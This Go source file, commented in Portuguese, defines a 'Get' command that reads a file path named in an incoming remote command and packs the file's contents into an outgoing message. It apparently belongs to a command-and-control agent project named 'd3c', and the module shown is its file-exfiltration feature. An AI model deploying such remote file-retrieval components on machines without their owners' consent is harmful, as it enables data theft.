package commands

import (
	"d3c/commons/estruturas"
	"d3c/commons/helpers"
	"os"
)

type Get struct {
	Comando   string
	ComandoId int
	Mensagem  *estruturas.Mensagem
}

func (instance Get) Executar() (resposta string) {
	var err error

	comandoSeparado := helpers.SeparaComando(instance.Comando)

	if len(comandoSeparado) > 1 {
		instance.Mensagem.Comandos[instance.ComandoId].Arquivo.Conteudo, err = os.ReadFile(comandoSeparado[1])

		if err != nil {
			resposta = "Erro ao copiar o arquivo: " + err.Error()
			instance.Mensagem.Comandos[instance.ComandoId].Arquivo.Erro = true
		} else {
			resposta = "Arquivo enviado com sucesso!"
			instance.Mensagem.Comandos[instance.ComandoId].Arquivo.Nome = comandoSeparado[1]
		}
	} else {
		resposta = "Especifique o arquivo a ser copiado!"
	}

	return
}
